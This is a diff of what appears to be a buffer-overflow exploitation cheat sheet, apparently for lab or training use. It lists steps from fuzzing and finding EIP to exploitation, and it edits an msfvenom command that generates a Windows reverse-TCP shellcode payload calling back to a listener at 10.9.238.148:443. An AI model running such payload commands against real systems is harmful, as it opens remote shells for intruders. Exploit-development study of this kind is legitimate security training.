@@ -3,7 +3,7 @@
 1. Connecting to vulnerable app
 ```nc <ip> <port> ```
 2. Fuzzing
-([Fuzzer.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/fuzzer.py))
+([fuzzer.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/fuzzer.py))
 
 3. Finding EIP
 ([finding_eip.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/finding-eip.py))
@@ -27,7 +27,7 @@ msf-pattern_offset -q $EIP
 
 6. Generating Shellcode 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.238.148 LPORT=443 EXITFUNC=thread -b "\x0\x07\x08\x2f\x2e\xa0\xa10" -f py -v shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.238.148 LPORT=443 EXITFUNC=thread -b "\x00\x00" -f py -v shellcode
 
 ```
 7. Exploiting
